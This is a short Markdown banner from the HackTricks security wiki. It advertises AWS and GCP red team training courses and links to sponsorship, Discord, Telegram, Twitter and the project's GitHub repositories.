Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
